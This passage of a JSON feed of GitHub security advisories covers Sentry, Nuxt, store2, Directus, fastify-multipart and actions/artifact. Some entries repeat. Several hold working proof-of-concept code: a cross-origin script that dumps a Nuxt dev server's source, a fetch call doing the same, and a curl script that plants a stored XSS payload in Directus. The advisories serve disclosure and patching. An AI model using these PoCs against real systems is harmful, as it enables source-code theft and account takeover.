            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/node] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T20:37:50.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>\n<h3 id=\"details\">Details</h3>\n<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src=\"http://localhost:3000/_nuxt/app.js\"&gt;</code> in their site and run the script.\nBy using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a nuxt project with webpack / rspack builder.</li>\n<li>Run <code>npm run dev</code></li>\n<li>Open <code>http://localhost:3000</code></li>\n<li>Run the script below in a web site that has a different origin.</li>\n<li>You can see the source code output in the document and the devtools console.</li>\n</ol>\n<pre><code class=\"language-js\">const script = document.createElement('script')\nscript.src = 'http://localhost:3000/_nuxt/app.js'\nscript.addEventListener('load', () =&gt; {\n  for (const page in window.webpackChunknuxt_app) {\n    const moduleList = window.webpackChunknuxt_app[page][1]\n    console.log(moduleList)\n\n    for (const key in moduleList) {\n      const p = document.createElement('p')\n      const title = document.createElement('strong')\n      title.textContent = key\n      const code = document.createElement('code')\n      code.textContent = moduleList[key].toString()\n      p.append(title, ':', document.createElement('br'), code)\n      document.body.appendChild(p)\n    }\n  }\n})\ndocument.head.appendChild(script)\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85\">\nIt contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24361\">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99",
            "title": "[@nuxt/rspack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:43.000Z",
            "date_published": "2025-01-27T11:31:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.</p>\n<h3 id=\"details\">Details</h3>\n<p>Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject <code>&lt;script src=\"http://localhost:3000/_nuxt/app.js\"&gt;</code> in their site and run the script.\nBy using <code>Function::toString</code> against the values in <code>window.webpackChunknuxt_app</code>, the attacker can get the source code.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a nuxt project with webpack / rspack builder.</li>\n<li>Run <code>npm run dev</code></li>\n<li>Open <code>http://localhost:3000</code></li>\n<li>Run the script below in a web site that has a different origin.</li>\n<li>You can see the source code output in the document and the devtools console.</li>\n</ol>\n<pre><code class=\"language-js\">const script = document.createElement('script')\nscript.src = 'http://localhost:3000/_nuxt/app.js'\nscript.addEventListener('load', () =&gt; {\n  for (const page in window.webpackChunknuxt_app) {\n    const moduleList = window.webpackChunknuxt_app[page][1]\n    console.log(moduleList)\n\n    for (const key in moduleList) {\n      const p = document.createElement('p')\n      const title = document.createElement('strong')\n      title.textContent = key\n      const code = document.createElement('code')\n      code.textContent = moduleList[key].toString()\n      p.append(title, ':', document.createElement('br'), code)\n      document.body.appendChild(p)\n    }\n  }\n})\ndocument.head.appendChild(script)\n</code></pre>\n<p><img alt=\"image\" src=\"https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85\">\nIt contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the <code>sourcesContent</code> field).</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Users using webpack / rspack builder may get the source code stolen by malicious websites.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24361\">https://nvd.nist.gov/vuln/detail/CVE-2025-24361</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4gf7-ff8x-hq99\">https://github.com/advisories/GHSA-4gf7-ff8x-hq99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99",
            "title": "[@nuxt/webpack-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:43.000Z",
            "date_published": "2025-01-27T11:31:41.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4gf7-ff8x-hq99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Nuxt allows any websites to send any requests to the development server and read the response due to default CORS settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>While Vite patched the default CORS settings to fix <a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a>, nuxt uses its own CORS handler by default (<a href=\"https://github.com/nuxt/nuxt/pull/23995\">https://github.com/nuxt/nuxt/pull/23995</a>).</p>\n<p><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></p>\n<p>That CORS handler sets <code>Access-Control-Allow-Origin: *</code>.</p>\n<blockquote>\n<p>[!IMPORTANT]<br>If on an affected version, it may be possible to opt-out of the default Nuxt CORS handler by configuring <code>vite.server.cors</code>.</p>\n</blockquote>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Start a dev server in any nuxt project using Vite by <code>nuxt dev</code>.</li>\n<li>Send a fetch request to <code>http://localhost:3000/_nuxt/app.vue</code> (<code>fetch('http://localhost:3000/_nuxt/app.vue')</code>) from a different origin page.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Users with the default server.cors option using Vite builder may get the source code stolen by malicious websites</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p><code>/__nuxt_vite_node__/manifest</code> / <code>/__nuxt_vite_node__/module</code> also seems to have <code>Access-Control-Allow-Origin: *</code>, so it maybe also possible to exploit that handler.\n<a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a>\nAlthough I didn't find a valid module id.\nNote that this handler is probably also vulnerable to DNS rebinding attacks as I didn't find any host header checks.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47\">https://github.com/nuxt/nuxt/security/advisories/GHSA-2452-6xj8-jh47</a></li>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24360\">https://nvd.nist.gov/vuln/detail/CVE-2025-24360</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/pull/23995\">https://github.com/nuxt/nuxt/pull/23995</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f\">https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/client.ts#L257-L263</a></li>\n<li><a href=\"https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39\">https://github.com/nuxt/nuxt/blob/7d345c71462d90187fd09c96c7692f306c90def5/packages/vite/src/vite-node.ts#L39</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2452-6xj8-jh47\">https://github.com/advisories/GHSA-2452-6xj8-jh47</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2452-6xj8-jh47",
            "title": "[@nuxt/vite-builder] Opening a malicious website while running a Nuxt dev server could allow read-only access to code",
            "date_modified": "2025-01-27T11:31:15.000Z",
            "date_published": "2025-01-27T11:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2452-6xj8-jh47"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross Site Scripting vulnerability in nbubna store v.2.14.2 and before allows a remote attacker to execute arbitrary code via the store.deep.js component</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-57556\">https://nvd.nist.gov/vuln/detail/CVE-2024-57556</a></li>\n<li><a href=\"https://github.com/nbubna/store/issues/127\">https://github.com/nbubna/store/issues/127</a></li>\n<li><a href=\"https://github.com/nbubna/store/pull/128\">https://github.com/nbubna/store/pull/128</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w5hq-hm5m-4548\">https://github.com/advisories/GHSA-w5hq-hm5m-4548</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w5hq-hm5m-4548",
            "title": "[store2] Cross Site Scripting vulnerability in store2",
            "date_modified": "2025-01-24T22:33:06.000Z",
            "date_published": "2025-01-24T00:31:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w5hq-hm5m-4548"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directus allows an authenticated attacker to save cross site scripting code to the database. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with <a href=\"https://github.com/directus/directus/security/advisories/GHSA-3fff-gqw3-vj86\">CVE-2024-6534</a>, it could result in account takeover.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>To exploit this vulnerability, we need to do the following steps using a non-administrative, default role attacker account.</p>\n<ol>\n<li>Upload the following JavaScript file.</li>\n</ol>\n<p>Using the upload functionality at <code>POST /files</code>. This PoC will show an alert message.</p>\n<pre><code class=\"language-js\">export TARGET_HOST=\"http://localhost:8055\"\nexport ATTACKER_EMAIL=\"malicious@malicious.com\"\nexport ATTACKER_PASSWORD=\"123456\"\nroot_dir=$(dirname $0)\nmkdir \"${root_dir}/static\"\n\ncurl -s -k -o /dev/null -w \"%{http_code}\" -X 'POST' \"${TARGET_HOST}/auth/login\" \\\n    -c \"${root_dir}/static/attacker_directus_session_token\" \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"email\\\":\\\"${ATTACKER_EMAIL}\\\",\\\"password\\\":\\\"${ATTACKER_PASSWORD}\\\",\\\"mode\\\":\\\"session\\\"}\"\n\nid_url_file=$(echo \"alert('Successful DOM-based XSS')\" |\n  curl -s -k -X 'POST' \"${TARGET_HOST}/files\" \\\n    -b \"${root_dir}/static/attacker_directus_session_token\" \\\n    -F \"file=@-;type=application/x-javascript;filename=poc.js\" | jq -r \".data.id\")\n</code></pre>\n<ol start=\"2\">\n<li>Create a preset for a collection and store the preset ID.</li>\n</ol>\n<p>Or use a preset already created from GET /presets. The following example uses the direct_users preset.</p>\n<pre><code>attacker_user_id=$(curl -s -k \"${TARGET_HOST}/users/me\" \\ -b \"${root_dir}/static/attacker_directus_session_token\" | jq -r \".data.id\") curl -i -s -k -X 'POST' \"${TARGET_HOST}/presets\" \\ -H 'Content-Type: application/json' \\ -b \"${root_dir}/static/attacker_directus_session_token\" \\ --data-binary \"{\\\"layout\\\":\\\"cards\\\",\\\"bookmark\\\":null,\\\"role\\\":null,\\\"user\\\":\\\"${attacker_user_id}\\\",\\\"search\\\":null,\\\"filter\\\":null,\\\"layout_query\\\":{\\\"cards\\\":{\\\"sort\\\":[\\\"email\\\"]}},\\\"layout_options\\\":{\\\"cards\\\":{\\\"icon\\\":\\\"account_circle\\\",\\\"title\\\":\\\"&lt;iframe srcdoc=\\\\\\\"&lt;script src='http://localhost:8055/assets/${id_url_file}'&gt; &lt;/script&gt;\\\\\\\"&gt;\\\",\\\"subtitle\\\":\\\"{{ email }}\\\",\\\"size\\\":4}},\\\"refresh_interval\\\":null,\\\"icon\\\":\\\"bookmark\\\",\\\"color\\\":null,\\\"collection\\\":\\\"directus_users\\\"}\"\n</code></pre>\n<p>When the user visits the view that uses the directus_users preset, the JavaScript file will be executed.</p>\n<p>Notes:</p>\n<p>Need to use an iframe to execute the malicious JavaScript file to bypass the CSP policies. The payload structure is <code>&lt;iframe srcdoc=\\\"&lt;script src='URL_MALICIOUS_FILE'&gt; &lt;/script&gt;\\\"&gt;</code>.</p>\n<p>We can target any collection that uses the vulnerable template structure that renders the layout option section.</p>\n<p>In this PoC, the target is the same user who sends the payload, but if the attacking user has permission to modify or create presets for other users or even if he does not have permissions but can chain with CVE-2024-6534, he can achieve an account takeover.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw\">https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9qrm-48qf-r2rw\">https://github.com/advisories/GHSA-9qrm-48qf-r2rw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9qrm-48qf-r2rw",
            "title": "[directus] Directus has a DOM-Based cross-site scripting (XSS) via layout_options",
            "date_modified": "2025-01-23T22:36:50.000Z",
            "date_published": "2025-01-23T22:36:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9qrm-48qf-r2rw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When sharing an item, user can specify an arbitrary role. It allows user to use a higher-privileged role to see fields that otherwise the user should not be able to see.</p>\n<h3 id=\"details\">Details</h3>\n<p>Specifying <code>role</code> on share should be available only for admins. The current flow has a security flaw.</p>\n<p>Each other role should allow to share only in the context of the same role. As there is no role hierarchy in Directus, it is impossible to tell which role is <em>higher</em> or <em>lower</em>, so only admins should be able to specify the role for share.</p>\n<p>Optionally, instead of specifying a role, shareer* should be able to specify which fields (limited to fields shareer sees) are available on shared item. Similarily to import.</p>\n<p>*<em>shareer</em> - a person that creates a share link to item</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a collection with a secret field. </li>\n<li>Create role A that sees the secret field</li>\n<li>Create role B that does not see the secret field, but can use share feature.</li>\n<li>Create item with secret field filled. </li>\n<li>Use account with role B to share the object as role A and gain unauthorized access to secret value.</li>\n</ol>\n<p>Here's video example: <a href=\"https://www.youtube.com/watch?v=DbV4IxbWzN4\">https://www.youtube.com/watch?v=DbV4IxbWzN4</a>\nI had to upload it to YouTube, because GitHub allows only 10MB videos.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Impacted are instances that use the share feature and have specific roles hierarchy and fields that are not visible for certain roles.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg\">https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24353\">https://nvd.nist.gov/vuln/detail/CVE-2025-24353</a></li>\n<li><a href=\"https://github.com/directus/directus/pull/23716\">https://github.com/directus/directus/pull/23716</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804\">https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804</a></li>\n<li><a href=\"https://github.com/directus/directus/releases/tag/v11.2.0\">https://github.com/directus/directus/releases/tag/v11.2.0</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=DbV4IxbWzN4\">https://www.youtube.com/watch?v=DbV4IxbWzN4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pmf4-v838-29hg\">https://github.com/advisories/GHSA-pmf4-v838-29hg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pmf4-v838-29hg",
            "title": "[directus] Directus allows privilege escalation using Share feature",
            "date_modified": "2025-01-23T22:35:53.000Z",
            "date_published": "2025-01-23T22:35:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pmf4-v838-29hg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>saveRequestFiles</code> function does not delete the uploaded temporary files when user cancels the request.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in version 8.3.1 and 9.0.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not use <code>saveRequestFiles</code>.</p>\n<h3 id=\"references\">References</h3>\n<p>This was identified in <a href=\"https://github.com/fastify/fastify-multipart/issues/546\">https://github.com/fastify/fastify-multipart/issues/546</a> and fixed in <a href=\"https://github.com/fastify/fastify-multipart/pull/567\">https://github.com/fastify/fastify-multipart/pull/567</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh\">https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li>\n<li><a href=\"https://github.com/fastify/fastify-multipart/issues/546\">https://github.com/fastify/fastify-multipart/issues/546</a></li>\n<li><a href=\"https://github.com/fastify/fastify-multipart/pull/567\">https://github.com/fastify/fastify-multipart/pull/567</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24033\">https://nvd.nist.gov/vuln/detail/CVE-2025-24033</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-27c6-mcxv-x3fh\">https://github.com/advisories/GHSA-27c6-mcxv-x3fh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-27c6-mcxv-x3fh",
            "title": "[@fastify/multipart] Unlimited consumption of resources in @fastify/multipart",
            "date_modified": "2025-01-23T23:17:18.000Z",
            "date_published": "2025-01-23T18:02:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-27c6-mcxv-x3fh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <code>saveRequestFiles</code> function does not delete the uploaded temporary files when user cancels the request.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in version 8.3.1 and 9.0.3</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Do not use <code>saveRequestFiles</code>.</p>\n<h3 id=\"references\">References</h3>\n<p>This was identified in <a href=\"https://github.com/fastify/fastify-multipart/issues/546\">https://github.com/fastify/fastify-multipart/issues/546</a> and fixed in <a href=\"https://github.com/fastify/fastify-multipart/pull/567\">https://github.com/fastify/fastify-multipart/pull/567</a>.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh\">https://github.com/fastify/fastify-multipart/security/advisories/GHSA-27c6-mcxv-x3fh</a></li>\n<li><a href=\"https://github.com/fastify/fastify-multipart/issues/546\">https://github.com/fastify/fastify-multipart/issues/546</a></li>\n<li><a href=\"https://github.com/fastify/fastify-multipart/pull/567\">https://github.com/fastify/fastify-multipart/pull/567</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24033\">https://nvd.nist.gov/vuln/detail/CVE-2025-24033</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-27c6-mcxv-x3fh\">https://github.com/advisories/GHSA-27c6-mcxv-x3fh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-27c6-mcxv-x3fh",
            "title": "[@fastify/multipart] Unlimited consumption of resources in @fastify/multipart",
            "date_modified": "2025-01-23T23:17:18.000Z",
            "date_published": "2025-01-23T18:02:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-27c6-mcxv-x3fh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Versions of <code>actions/artifact</code> before 2.1.7 are vulnerable to arbitrary file write when using <code>downloadArtifactInternal</code>, <code>downloadArtifactPublic</code>, or <code>streamExtractExternal</code> for extracting a specifically crafted artifact that contains path traversal filenames.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to version 2.1.7 or higher. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://snyk.io/research/zip-slip-vulnerability\">https://snyk.io/research/zip-slip-vulnerability</a></li>\n<li><a href=\"https://github.com/actions/toolkit/pull/1724\">https://github.com/actions/toolkit/pull/1724</a></li>\n</ul>\n<h3 id=\"cve\">CVE</h3>\n<p>CVE-2024-42471</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Justin Taft from Google</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3\">https://github.com/actions/toolkit/security/advisories/GHSA-6q32-hq47-5qq3</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42471\">https://nvd.nist.gov/vuln/detail/CVE-2024-42471</a></li>\n<li><a href=\"https://github.com/actions/toolkit/pull/1724\">https://github.com/actions/toolkit/pull/1724</a></li>\n<li><a href=\"https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017\">https://github.com/actions/toolkit/commit/29885a805ef3e95a9862dcaa8431c30981960017</a></li>\n<li><a href=\"https://snyk.io/research/zip-slip-vulnerability\">https://snyk.io/research/zip-slip-vulnerability</a></li>\n<li><a href=\"https://github.com/actions/toolkit/pull/1602\">https://github.com/actions/toolkit/pull/1602</a></li>\n<li><a href=\"https://github.com/actions/download-artifact/blob/v3/package.json#L31\">https://github.com/actions/download-artifact/blob/v3/package.json#L31</a></li>\n<li><a href=\"https://github.com/actions/toolkit/pull/1666\">https://github.com/actions/toolkit/pull/1666</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q32-hq47-5qq3\">https://github.com/advisories/GHSA-6q32-hq47-5qq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q32-hq47-5qq3",
            "title": "[@actions/artifact] @actions/artifact has an Arbitrary File Write via artifact extraction",
            "date_modified": "2025-01-22T18:45:02.000Z",
            "date_published": "2024-09-03T20:08:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q32-hq47-5qq3"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}